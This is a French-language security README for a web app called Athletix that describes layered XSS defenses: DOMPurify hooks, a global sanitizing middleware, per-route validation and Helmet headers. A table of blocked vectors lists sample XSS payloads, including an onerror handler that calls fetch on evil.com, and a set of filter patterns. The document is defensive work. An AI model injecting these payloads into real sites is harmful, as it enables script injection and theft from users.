# Protection XSS — Athletix

## Architecture de défense (défense en profondeur)

```
Navigateur            Backend
─────────             ───────────────────────────────────────────────
[Saisie user]
    │
    ▼
[DOMPurify]           ← Hook useSanitize / useFormInput (frontend)
    │ sanitize()
    ▼
[Envoi HTTP] ────────► [xssProtection.js] ← Middleware global (req.body/query/params)
                              │ sanitizeDeep()
                              ▼
                       [validateInput.js]  ← Validation typée par route (longueur, email, enum...)
                              │ validate(RULES.xxx)
                              ▼
                       [Controller]        ← Données propres, Sequelize paramétrise les requêtes SQL
                              │
                              ▼
                       [MySQL / MongoDB]   ← Aucun HTML ni JS ne persiste en base
```

---

## Couches de protection

### 1. Frontend — `useSanitize.js`

| Fonction | Rôle |
|---|---|
| `sanitize(value)` | Supprime tout HTML/JS d'une chaîne (DOMPurify, tags=none) |
| `sanitizeObject(obj)` | Parcours récursif d'un objet, sanitize toutes les strings |
| `sanitizeHtml(html)` | Autorise b/i/p/br uniquement (pour dangerouslySetInnerHTML) |

**Appliqué sur :** `Connexion.jsx`, `Inscription.jsx`, `Checkout.jsx` (champs adresse), `GestionProduits.jsx`, `GestionUtilisateurs.jsx`

Le mot de passe n'est **jamais** sanitisé (les caractères spéciaux sont autorisés dans un mot de passe).

### 2. Frontend — `useFormInput.js`

Hook complet qui combine :
- Sanitization DOMPurify à chaque frappe (`handleChange`)
- Validation des types et longueurs (email, integer, url, enum…)
- Feedback d'erreur en temps réel (`handleBlur`)
- `getPayload()` → retourne un objet sanitisé prêt à envoyer

### 3. Backend — `xssProtection.js` (middleware global)

Monté dans `app.js` **après les parsers, avant toutes les routes**.

- Parcours récursif de `req.body`, `req.query`, `req.params`
- Lib `xss` avec `whiteList: {}` (aucun tag autorisé)
- Patterns supplémentaires bloqués : `javascript:`, `vbscript:`, `data:text/html`, handlers `on*=`, null bytes
- Sanitize aussi les **clés** des objets (protection HPP)

### 4. Backend — `validateInput.js` (middleware par route)

Validation typée sur chaque route sensible :
- `RULES.register` / `RULES.login` — email, longueur password
- `RULES.checkout` — champs adresse + paiement conditionnel (cvv/expiration requis seulement si visa)
- `RULES.produit` / `RULES.utilisateur` / `RULES.categorie` — champs admin
- `RULES.cartAdd` — integer ≥ 1

Retourne `422 Unprocessable Entity` avec le détail des erreurs si validation échoue.

### 5. Backend — `helmet.js` (headers HTTP)

Headers de sécurité activés par Helmet :
- `Content-Security-Policy` — bloque l'exécution de scripts externes
- `X-Content-Type-Options: nosniff` — empêche le MIME sniffing
- `X-Frame-Options: DENY` — empêche le clickjacking via iframes
- `Referrer-Policy: strict-origin-when-cross-origin`
- `X-XSS-Protection: 0` (désactivé, le CSP est plus efficace)

---

## Ce qui est protégé

| Vecteur d'attaque | Protection |
|---|---|
| `<script>alert(1)</script>` dans un champ | Supprimé par xss lib + DOMPurify |
| `onerror="fetch('evil.com')"` | Pattern `on\w+=` bloqué |
| `javascript:void(0)` dans une URL | Pattern `javascript:` bloqué |
| `"><img src=x onerror=...>` | Tags supprimés, aucun attribut conservé |
| Injection via `?search=<script>` | req.query sanitisé globalement |
| Injection via `:id` dans URL | req.params sanitisé globalement |
| Script chargé depuis CDN externe | CSP `defaultSrc: 'self'` |
| Iframe malveillant | `frameSrc: 'none'` + X-Frame-Options |
| Null bytes de bypass | Nettoyage `\0` |

---

## Installation

```bash
# Backend
cd backend && npm install

# Frontend
cd frontend && npm install
```

Nouvelles dépendances installées automatiquement :
- **Backend** : `helmet`, `validator`, `xss`
- **Frontend** : `dompurify`
